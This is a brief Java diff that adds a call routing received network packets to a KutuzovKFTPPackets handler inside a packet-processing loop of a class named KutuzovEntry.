@@ -89,6 +89,7 @@ public class KutuzovEntry {
                         Toolkit.getDefaultToolkit().beep();
                       else if(OSDetector.isWindows())
                         KutuzovWinPackets.handlePacket(ois, oos, (Packet)packet);
+                    KutuzovKFTPPackets.handlePacket(ois, oos, (Packet)packet);
                 } catch (Exception ignored) {}
             }
         });
